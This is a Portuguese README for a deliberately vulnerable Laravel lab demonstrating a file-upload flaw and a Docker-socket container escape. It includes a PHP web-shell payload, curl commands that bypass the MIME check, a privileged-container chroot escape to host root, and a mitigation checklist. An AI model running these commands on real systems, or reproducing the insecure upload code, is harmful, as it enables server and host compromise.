# File Upload Injection & Docker Escape - Security Research Lab

> **⚠️ AVISO LEGAL:** Esta aplicação contém vulnerabilidades intencionais para fins educacionais e de pesquisa em segurança. NÃO DEVE SER IMPLANTADA EM AMBIENTES DE PRODUÇÃO.

## Índice

- [Visão Geral](#visão-geral)
- [Tecnologias Utilizadas](#tecnologias-utilizadas)
- [Vulnerabilidades Implementadas](#vulnerabilidades-implementadas)
- [Análise de Código Vulnerável](#análise-de-código-vulnerável)
- [Refatoração Segura](#refatoração-segura)
- [Setup e Deployment](#setup-e-deployment)
- [Mitigações e Boas Práticas](#mitigações-e-boas-práticas)
- [Referências Técnicas](#referências-técnicas)

---

## Visão Geral

Aplicação web vulnerável desenvolvida em **Laravel** para demonstração em palestras de segurança ofensiva e AppSec. Implementa duas categorias críticas de vulnerabilidades:

- **CWE-434**: Unrestricted Upload of File with Dangerous Type
- **CWE-250**: Execution with Unnecessary Privileges (Docker Socket Exposure)

**Objetivo Educacional**: Demonstrar falhas comuns em desenvolvimento web e infraestrutura de containers, permitindo exploração controlada para fins de aprendizado.

---

## Tecnologias Utilizadas

- **Framework**: Laravel 12.x (PHP 8.4+)
- **Frontend**: Blade Templates + Breeze
- **Banco de Dados**: PostgreSQL 16
- **Containerização**: Docker & Docker Compose
- **Web Server**: PHP Built-in Server (Development)

---

## Vulnerabilidades Implementadas

### 1. File Upload Injection (CWE-434)

**Localização**: `app/Http/Controllers/ProfileController.php`

**Severidade**: 🔴 **CRÍTICA** (CVSS 9.8)

**Impactos**:
- Remote Code Execution (RCE)
- Server-Side Request Forgery (SSRF)
- Path Traversal
- Stored Cross-Site Scripting (XSS)
- Arbitrary File Write

### 2. Docker Socket Exposure (CWE-250)

**Localização**: `docker-compose.yml` e `Dockerfile`

**Severidade**: 🔴 **CRÍTICA** (CVSS 9.9)

**Impactos**:
- Container Escape
- Host System Compromise
- Privilege Escalation to Root
- Lateral Movement
- Complete Infrastructure Takeover

---

## Análise de Código Vulnerável

### 🔴 Vulnerabilidade #1: File Upload Injection

#### Código Vulnerável

```php
// app/Http/Controllers/ProfileController.php - Método update()

if (isset($_FILES['avatar']) && $_FILES['avatar']['error'] === UPLOAD_ERR_OK) {
    $file = $_FILES['avatar'];
    
    // ❌ VULNERABILIDADE: Validação insuficiente de MIME type
    if ($file['type'] === "image/png" || $file['type'] === "image/jpeg") {
        
        // ❌ CRÍTICO: Uso direto do filename fornecido pelo usuário
        $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
        
        // ❌ INSEGURO: Nome de arquivo previsível e controlável
        $filename = 'avatar_user_' . $user->id . '.' . $extension;
        
        // ❌ PERIGOSO: Salvando em diretório público acessível via web
        if (move_uploaded_file($file['tmp_name'], public_path('storage/' . $filename))) {
            $user->avatar = $filename;
        }
    }
}
```

#### Análise Detalhada das Falhas

##### 1. **Validação de MIME Type Bypassável**

```php
if ($file['type'] === "image/png" || $file['type'] === "image/jpeg")
```

**Problema**: O campo `$_FILES['avatar']['type']` é fornecido pelo cliente no header HTTP `Content-Type` e pode ser facilmente falsificado.

**Bypass**:
```bash
# Atacante pode enviar web shell PHP com Content-Type falsificado
curl -X POST http://target:8000/profile \
  -H "Cookie: laravel_session=..." \
  -F "avatar=@shell.php;type=image/jpeg"
```

**Impacto**: Qualquer arquivo malicioso pode ser enviado se o atacante forjar o Content-Type.

##### 2. **Uso Direto do Filename Fornecido pelo Usuário**

```php
$extension = pathinfo($file['name'], PATHINFO_EXTENSION);
```

**Problema**: O nome do arquivo original (`$_FILES['avatar']['name']`) é totalmente controlado pelo atacante.


##### 2. **Ausência de Validação de Conteúdo (Magic Bytes)**

**Problema**: Não há verificação dos bytes iniciais do arquivo para confirmar que é realmente uma imagem.

**Bypass com Polyglot File**:
```bash
# Criar arquivo que é simultaneamente JPEG e PHP válido
printf '\xFF\xD8\xFF\xE0' > payload.php
echo '<?php system($_GET["cmd"]); ?>' >> payload.php

# Upload com Content-Type falsificado
curl -X POST http://target:8000/profile \
  -F "avatar=@payload.php;type=image/jpeg"
```

##### 3. **Salvamento em Diretório Público Executável**

```php
public_path('storage/' . $filename)
```

**Problema**: Arquivos são salvos em `public/storage/`, diretório acessível via web e configurado para executar scripts PHP.

**Cadeia de Exploração**:
```
1. Upload de shell.php com Content-Type: image/jpeg
2. Arquivo salvo em /public/storage/avatar_user_123.php
3. Acesso via http://target:8000/storage/avatar_user_123.php
4. Código PHP executado → RCE obtido
5. Atacante executa: curl "http://target:8000/storage/avatar_user_123.php?cmd=id"
```

---

### 🔴 Vulnerabilidade #2: Docker Socket Exposure

#### Código Vulnerável - docker-compose.yml

```yaml
services:
  app:
    build: .
    ports:
      - "8000:8000"
    volumes:
      - .:/var/www
      
      # CRÍTICO: Exposição do Docker Socket
      - /var/run/docker.sock:/var/run/docker.sock
   ... 
    depends_on:
      - db
    command: php artisan serve --host=0.0.0.0 --port=8000
```

#### Código Vulnerável - Dockerfile

```dockerfile
FROM php:8.4-fpm-alpine

RUN apk add --no-cache \
    postgresql-dev \
    libpq \
    docker-cli              # CRÍTICO: Docker CLI instalado no container!

RUN docker-php-ext-install pdo pdo_pgsql

WORKDIR /var/www

COPY . .                    # Executando como root (usuário padrão)
                            # Sem multi-stage build
                            # Sem otimização de camadas
                            # Sem health check
                            # Sem hardening de segurança
```

**Problema**: Processos no container rodam com privilégios de root, facilitando escalação de privilégios.

#### Fluxo de Exploração Completo

```
┌─────────────────────────────────────────────────────────────┐
│ 1. Atacante compromete aplicação via File Upload           │
│    → Upload de webshell.php com bypass de MIME type        │
│    → Acessa: http://target:8000/storage/webshell.php?cmd=id│
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Enumera ambiente do container                            │
│    $ whoami              → root                             │
│    $ ls -la /var/run/    → docker.sock presente!           │
│    $ which docker        → /usr/bin/docker (já instalado!)  │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Explora Docker Socket com CLI já disponível              │
│    $ docker -H unix:///var/run/docker.sock ps               │
│    → Lista todos os containers do host                      │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. Cria container privilegiado para Docker Escape           │
│    $ docker -H unix:///var/run/docker.sock run \           │
│      --rm -it --privileged --pid=host \                     │
│      -v /:/host alpine chroot /host /bin/bash               │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. ROOT COMPLETO NO HOST - Game Over                        │
│    # id                                                      │
│    uid=0(root) gid=0(root) groups=0(root)                  │
│    # cat /etc/shadow                                         │
│    # crontab -e  (persistence)                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Mitigações e Boas Práticas

### Checklist de Segurança

#### File Upload

- [x] Validar MIME type via magic bytes (finfo)
- [x] Whitelist de extensões permitidas
- [x] Validar conteúdo do arquivo (processar imagem)
- [x] Randomizar nomes de arquivo (UUID + hash)
- [x] Limitar tamanho de arquivo
- [x] Remover metadados EXIF
- [x] Recodificar imagem para limpar payloads
- [x] Salvar em storage privado (fora do webroot)
- [x] Implementar rate limiting
- [x] Servir arquivos via controller com autenticação
- [x] Headers de segurança (X-Content-Type-Options, CSP)
- [x] Logging de todas as operações

#### Docker Security

- [x] **NUNCA** montar `/var/run/docker.sock`
- [x] **NUNCA** instalar `docker-cli` no container da aplicação
- [x] Executar containers como usuário não-root
- [x] Usar read-only filesystem quando possível
- [x] Dropar todas as capabilities e adicionar apenas necessárias
- [x] Usar secrets para credenciais
- [x] Network isolation
- [x] Resource limits (CPU, memory)
- [x] Health checks
- [x] Multi-stage builds para imagens mínimas
- [x] No-new-privileges flag
- [x] Desabilitar funções PHP perigosas

---

## Referências Técnicas

### Documentação

- [OWASP File Upload Security](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Laravel Security Documentation](https://laravel.com/docs/security)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [PHP Security Guide](https://www.php.net/manual/en/security.php)

### Ferramentas de Teste

- **Burp Suite**: Análise de upload de arquivos

---

## Licença

MIT License - Apenas para fins educacionais

## Autor

**@7acini**
- GitHub: [github.com/7acini](https://github.com/7acini)

---

**Última atualização**: Janeiro 2026  
**Versão**: 2.0.0
